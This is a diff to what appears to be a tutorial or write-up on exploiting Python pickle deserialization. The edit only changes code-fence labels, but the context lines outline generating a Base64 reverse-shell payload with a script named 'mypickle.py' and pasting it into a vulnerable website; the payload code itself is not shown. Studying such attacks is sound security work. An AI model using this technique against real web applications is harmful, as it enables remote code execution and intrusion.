@@ -10,7 +10,7 @@ The python “pickle” module, that serializes and deserializes a Python object
 # Exploitation
 Below is the Python script (”mypickle.py”) to generate the payload to reverse shell.
 
-```PY
+```py
 import pickle
 import base64
 import os
@@ -26,7 +26,7 @@ if __name__ == '__main__':
 ```
 Now run this script to generate the Base64 payload.
 
-```PY
+```py
 python3 mypickle.py
 ```
 Copy the ourput base64 string and paste it to where the payload affects in website.
